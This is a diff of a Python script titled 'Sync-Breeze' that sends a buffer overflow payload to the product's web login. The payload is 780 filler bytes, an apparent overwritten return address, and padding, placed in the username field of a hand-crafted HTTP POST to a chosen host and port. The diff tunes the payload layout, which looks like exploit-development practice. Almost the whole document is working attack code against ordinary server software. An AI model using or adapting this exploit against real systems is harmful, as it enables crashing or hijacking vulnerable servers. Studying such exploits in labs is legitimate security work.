@@ -1,30 +1,36 @@
 #!/usr/bin/python3
 
+
 import sys,socket
-from time import sleep
+import time
 
+print("*****Sync-Breeze*****")
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
+port=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
-        print("port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*50)
+        print("Port number field is empty")
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*50)
         print("IP address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*50)
         print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*50)
         print("Issues with the user input")
 
-elif (len(ip_address)>0) or (len(port_number)>0):
-    size=b"A" * 780 + b"\x83\x0C\x09\x10" + b"C" *(1200-780-16)
+
+elif (len(ip_address)>0) and (len(port)>0):
+    print("*"*50)
+    size=b"A"* 780 + b"\x83\x0C\x09\x10" + b"C" * 4 + b"D" *(1500-4-780)
+
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
+    s.connect((ip_address,int(port)))
+
     buff=b"username=" + size + b"&password=A"
 
 
@@ -35,7 +41,7 @@ elif (len(ip_address)>0) or (len(port_number)>0):
     buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
     buffer+=b"Accept-Encoding: gzip, deflate\r\n"
     buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
-    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8')+ b"\r\n"
+    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8') + b"\r\n"
     buffer+=b"Origin: http://192.168.100.215\r\n"
     buffer+=b"Connection: keep-alive\r\n"
     buffer+=b"Referer: http://192.168.100.215/login\r\n"
@@ -43,4 +49,3 @@ elif (len(ip_address)>0) or (len(port_number)>0):
 
     buffer=buffer+buff
     s.send((buffer))
-    s.close()
